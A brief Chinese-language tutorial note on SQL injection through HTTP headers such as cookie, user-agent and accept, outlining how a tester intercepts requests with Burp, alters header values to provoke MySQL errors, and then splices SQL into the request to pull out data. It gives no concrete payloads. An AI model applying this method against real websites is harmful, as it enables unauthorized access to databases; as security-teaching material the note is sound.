HTTP Header注入

开发人员为了验证客户端头信息(比如常用的cookie验证)或通过http header头信息获取客户端的一些信息，比如useragent、accept字段等。

会对客户端的http header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能导致基于http header的SQL Inject漏洞。

可使用MySQL语句拼接，进行获取相关信息

例子

首先用burp抓包，修改包内判断前端获取的信息，提交看看是否有mysql报错，
如果有，则在抓到的包内进行sql语句的拼接，来获取信息
